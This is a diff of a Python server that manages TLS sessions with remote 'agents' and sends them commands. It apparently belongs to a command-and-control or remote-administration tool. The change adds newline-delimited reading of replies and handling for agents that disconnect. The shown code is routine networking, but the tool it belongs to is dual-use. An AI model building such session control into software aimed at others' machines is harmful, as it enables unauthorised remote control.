@@ -206,26 +206,22 @@ def accept_clients(server_socket: socket.socket) -> None:
 # Interface interactive agent
 # ---------------------------------------------------------------------------
 
-
 def send_command_and_recv(conn: socket.socket, command: str, extra: dict | None = None) -> dict[str, Any]:
-    """
-    Envoie une commande à un agent et attend sa réponse.
-
-    Args:
-        conn: Socket TLS de l'agent.
-        command: Nom de la commande à envoyer.
-        extra: Champs supplémentaires à ajouter au message (ex: chemin fichier).
-
-    Returns:
-        dict: Réponse de l'agent.
-    """
     message: dict[str, Any] = {"type": "command", "command": command}
     if extra:
         message.update(extra)
 
     conn.sendall(encode_message(message))
-    data = conn.recv(65536)
-    return decode_message(data.decode("utf-8").strip())
+    
+    # Read until newline delimiter
+    buffer = b""
+    while b"\n" not in buffer:
+        chunk = conn.recv(65536)
+        if not chunk:
+            break
+        buffer += chunk
+    
+    return decode_message(buffer.decode("utf-8").strip())
 
 
 def interact_with_session(session_id: int) -> None:
@@ -325,6 +321,10 @@ def interact_with_session(session_id: int) -> None:
 
         except KeyboardInterrupt:
             print()
+            break
+        except BrokenPipeError:
+            print(f"\n[-] Agent {session_id} déconnecté.")
+            remove_session(session_id)
             break
         except Exception as exc:
             logger.exception("Erreur lors de l'interaction avec la session %s : %s", session_id, exc)
